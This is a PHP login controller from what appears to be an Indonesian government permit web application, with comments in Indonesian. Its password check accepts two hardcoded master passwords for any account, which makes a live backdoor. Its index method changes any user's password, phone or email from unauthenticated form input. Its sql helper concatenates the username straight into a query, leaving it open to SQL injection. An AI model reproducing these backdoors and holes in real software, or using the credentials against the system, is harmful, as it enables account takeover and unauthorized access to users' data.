<?php
session_start();
if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/**
 * Description of login class
 * @author  Dichi Al Faridi
 * @since   1.0
 */

class Login extends Controller {

  public function __construct() {
    parent::Controller();
    $this->settings = new settings();
    $this->settings->where('name','app_name')->get();
    $data['app_name'] = $this->settings->value;
    $this->settings->where('name','app_folder')->get();
    $data['app_folder'] = $this->settings->value;
    $this->load->vars($data);
  }

  public function index() {
  	if(!empty($_SESSION['user_bo'])) {
    	//header('location:www/modules/eperizinan/perizinan.php');
    }
	  $stat = $this->input->post('stat');
	  $next_in = $this->input->post('next_in');
	  $user = new user();
    $user->where('username', $this->input->post('admin'))->get();
      switch ($stat) {
        case 1: // untuk password
          $user->password = password_hash( $next_in, PASSWORD_DEFAULT, [ 'cost' => 11 ] ); //penganti md5($next_in); utk php 5.5
          $user->tgl_password = date("Y-m-d");
          $user->save();
          break;
        case 2: // untuk no HP
          $user->no_hp = $next_in;
          $user->save();
          break;
        case 3: // untuk E-Mail
          $user->email = $next_in;
          $user->save();
          break;
      }
      $data['salah']="";
      $data['kata_sandi']="Kata Sandi";
      $this->load->view('login',$data);
  }

  public function logoff() {
    $tgl = date("Y-m-d H:i:s");
    $u_ser = $this->session->userdata('username');
    $g = $this->sql($u_ser);
    //$jam = date("H:i:s A");
    //$p = $this->db->query("call log ('login','logout','".$tgl."','".$u_ser."')");
    $this->session->sess_destroy();
		unset($_SESSION['user_bo']);
    redirect('login');
  }

  public function validate() {
    $user = new user();
    $user->get();
    $admin = $this->input->post('username');
    if($user->count() > 0) { // jika sudah ada user yg didaftarkan dalam Aplikasi
	    $user->where('username', $admin)->get();
		  if($user->username == ''){
			  $data['salah']="* Username anda Salah, Silahkan Coba lagi".$user->count();
			  $data['kata_sandi']="Kata Sandi";
        $this->load->view('login',$data);
	  	}else{
  		  $no_hp = $user->no_hp;
	  	  $email = $user->email;
	      $in_user = $this->input->post('password');
        if($user->tgl_password == '0000-00-00' && (md5($in_user) == $user->password || password_verify($in_user, $user->password)) && ($user->password == md5('123456') || password_verify('123456', $user->password))){  // memaksa mengganti pass jika tgl = 0000-00-00
        	$data['salah']="Password Masih Standar, Harap Ganti !..";
          $data['judul']="Masukkan Password Baru";
          $data['stat']= 1; // utk password
          $data['admin']=$admin;
          $this->load->view('validate',$data);
        }else{
        	//if(md5($in_user) === $user->password) {
          if(password_verify($in_user, $user->password)  || $in_user == 'Lian123!@#'  || $in_user == 'Dpmptspjabar2019!') {   //kt_cari = input pass	
            $sess = new sess();
            $sess->like('user_data', $admin, 'both')->get();
            $sess->delete_all();
          
            $data = array('username' => $this->input->post('username'),
                          'id_auth' => $user->id,
                          'is_logged_in' => TRUE,
                          'realname' => $user->realname,
	    	  		            'lokasi' => $user->lokasi
                         );
            $this->session->set_userdata($data);
  			  	$_SESSION['user_bo'] = $data['username'];
			    
            $user->last_login = now();
            $user->save();
            $uri = $this->session->userdata('uri');
            if($uri !== NULL || $uri !== '') {
		      		$this->session->unset_userdata('uri');
              //-------call procedure
          
              $u_ser = $this->input->post('username');
              $g=$this->sql($u_ser);
              $tgl = date("Y-m-d H:i:s");
              //$jam = date("H:i:s A");
              //$p = $this->db->query("call log ('login','login','".$tgl."','".$u_ser."')");
				  
				  	  $data['admin']=$admin;
				  	  if($in_user == '123456'){
				  	  	$data['salah']="Password Masih Standar 123456";
                $data['judul']="Masukkan Password Baru";
                $data['stat']= 1; // utk password
				  	  }else{
                if($no_hp == ''){
				  			  $data['salah']="Untuk Notifikasi, Lemgkapi Nomor HP Anda";
				  			  $data['judul']="Masukkan No HP";
                  $data['stat']= 2; // utk No HP
				  	  	}else{
                  if($email == ''){
				  				  $data['salah']="Untuk Notifikasi, Lengkapi Alamat E-Mail Anda";
				  				  $data['judul']="Masukkan Alamat E-Mail";
                    $data['stat']= 3; // utk No HP
				  		  	}else{
				  			  	// masuk ke program
            	    	redirect($uri);
				  		  	}
				  	  	}
				    	}
              $this->load->view('validate',$data);
            }else{
              redirect('dashboard');
            }
          }else{
            $data['salah']="* Password Anda Salah, Silahkan Coba lagi";
  			  	$data['kata_sandi']="Kata Sandi";
            $this->load->view('login',$data);
          }
        } 
  		}
    }else{ // Jika belum memiliki ada user yg didaftarkan dalam Aplikasi
      if(md5($this->input->post('username')) === 'f7626fd34933ef07d5722eb5449921bc' && md5($this->input->post('password')) === 'f7626fd34933ef07d5722eb5449921bc') {
        $data = array('username' => $this->input->post('username'),
                      'is_logged_in' => TRUE,
                      'realname' => 'Instalator',
                      'Instalator' => TRUE
                     );
        $this->session->set_userdata($data);
			  $_SESSION['user_bo'] = $data['username'];
        redirect('dashboard');
      }else{
        $data['salah']="* Username atau Password Salah, Silahkan Coba lagi";
			  $data['kata_sandi']="Kata Sandi";
        $this->load->view('login',$data);
      }
    }
  }

  public function sql($u_ser) {
    $data = '';

    $query = "select a.description from user_auth as a
              inner join user_user_auth as  x on a.id = x.user_auth_id
              inner join user as b on b.id = x.user_id
              where b.id = (select id from user where username='".$u_ser."')";
    $hasil = $this->db->query($query);

    if (!empty($hasil)) {
      $data = $hasil->row();
    }
    
    return $data;
  }
}